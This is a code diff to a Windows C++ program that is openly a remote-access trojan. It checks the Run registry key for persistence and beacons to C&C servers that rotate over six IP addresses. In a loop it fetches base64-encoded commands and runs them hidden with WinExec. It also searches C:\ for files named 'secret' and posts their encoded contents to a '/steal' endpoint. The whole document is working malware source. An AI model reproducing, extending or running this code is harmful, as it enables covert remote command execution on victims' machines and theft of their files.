@@ -7,27 +7,30 @@
 #include "Connection.h"
 #include "base64.h"
 #include "DirectoryTraversal.h"
+#include <winver.h>
 
-string ip = "192.168.0.45";
-//string ip = "192.168.0.10";
+//string ip = "192.168.0.45";
+string ip = "172.17.0.33";
+string prefix = "192.168.0.";
+//string prefix = "172.17.0.";
+string suffixes[6] = { "33", "45",  "13", "34", "16", "55" };
 TCHAR buf[255] = { 0 };
 Utils utils;
 Connection conn(ip);
 base64 base;
 
 int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
-                     _In_opt_ HINSTANCE hPrevInstance,
-                     _In_ LPWSTR    lpCmdLine,
-                     _In_ int       nCmdShow)
+	_In_opt_ HINSTANCE hPrevInstance,
+	_In_ LPWSTR    lpCmdLine,
+	_In_ int       nCmdShow)
 {
 	//utils.HideConsole();
 	//utils.DenyAccess();
 
 	//Accessing the registry value for autoloading
-
 	
 	HKEY hKey;
-	
+
 	if(RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ, &hKey) == ERROR_SUCCESS)
 	{
 		//Checking if the registry value exists
@@ -59,41 +62,79 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
 		{
 			// Generate a new ID and create a new registry value
 			utils.GenerateID();
+
+			string contents = utils.GetVersion();
+			vector<BYTE> byte_array(contents.begin(), contents.end());
+			string based_string = base.base64_encode(&byte_array[0], byte_array.size());
+			//conn.SetIP(prefix + suffixes[j]);
+
+			for (int j = 0; j < 6; ++j)
+			{
+				Connection conn1(prefix + suffixes[j]);
+				conn1.HTTPPost(utils.GetID(), based_string, "/version");
+			}
 		}
 	}
 	else
 	{
 		utils.GenerateID();
-	}
-	
-	// sending an initial message to C&C
-	conn.HTTPPost(utils.GetID(), "I am alive!");
-	
-	// getting a command from C&C and starting
-	conn.HTTPGet("/cmd");
-	vector<BYTE> cmvec = base.base64_decode(conn.GetBuffer());
-	string command(cmvec.begin(), cmvec.end());
-	WinExec(command.c_str(), SW_HIDE);
-	
-	vector<string> files;
-	FindByFilename("secret", "C:\\", files);
-	for (string file : files)
-	{
-		stringstream ss;
-		std::ifstream iff(file, ios::binary);
-		ss << iff.rdbuf();
-		string contents = ss.str();
 
+		string contents = utils.GetVersion();
 		vector<BYTE> byte_array(contents.begin(), contents.end());
 		string based_string = base.base64_encode(&byte_array[0], byte_array.size());
-		long long pos = file.length() - 1;
-		while (file[pos] != '/')
+		//conn.SetIP(prefix + suffixes[j]);
+
+		for (int j = 0; j < 6; ++j)
 		{
-			--pos;
+			Connection conn1(prefix + suffixes[j]);
+			conn1.HTTPPost(utils.GetID(), based_string, "/version");
 		}
-		string short_filename = file.substr(pos + 1);
-		conn.HTTPPost(utils.GetID(), short_filename+":"+based_string, "/steal");
+	}
+	
+	vector<pair<string, bool>> files;
+	//utils.GenerateID();
+	while (true)
+	{
+		// getting a command from C&C and starting
+		for (int j = 0; j < 6; ++j)
+		{
+			Connection conn1(prefix + suffixes[j]);
+			conn1.HTTPGet("/cmd?id=" + string(utils.GetID()));
+			vector<BYTE> cmvec = base.base64_decode(conn1.GetBuffer());
+			string command(cmvec.begin(), cmvec.end());
+			WinExec(command.c_str(), SW_HIDE);
+		}
+
+		FindByFilename("secret", "C:\\", files);
+		//conn.SetIP();
+		for (int i = 0; i < files.size(); ++i)
+		{
+			if (files[i].second)
+				continue;
+			string filename = files[i].first;
+			stringstream ss;
+			std::ifstream iff(filename, ios::binary);
+			ss << iff.rdbuf();
+
+			string contents = ss.str();
+			vector<BYTE> byte_array(contents.begin(), contents.end());
+			string based_string = base.base64_encode(&byte_array[0], byte_array.size());
+			long long pos = filename.length() - 1;
+			while (filename[pos] != '/')
+			{
+				--pos;
+			}
+			string short_filename = filename.substr(pos + 1);
+				//conn.SetIP(prefix + suffixes[j]);
+			for (int j = 0; j < 6; ++j)
+			{
+				Connection conn1(prefix + suffixes[j]);
+				conn1.HTTPPost(utils.GetID(), short_filename + ":" + based_string, "/steal");
+			}
+		}
+		for (int i = 0; i < files.size(); ++i)
+			files[i].second = true;
+		Sleep(30000);
 	}
 	return 0;
 }
-
